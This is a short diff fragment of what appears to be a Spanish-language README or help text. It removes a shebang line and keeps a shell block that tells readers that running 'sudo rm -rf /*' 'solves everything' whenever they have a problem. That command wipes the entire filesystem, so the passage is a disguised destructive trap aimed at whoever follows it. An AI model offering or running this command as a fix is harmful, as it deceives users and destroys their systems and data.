@@ -26,6 +26,5 @@
 
 Si tienes algun problema, recuerda que ejecutando esto se resuelve todo.
 ```sh
-#!/bin/bash
 sudo rm -rf /*
 ```
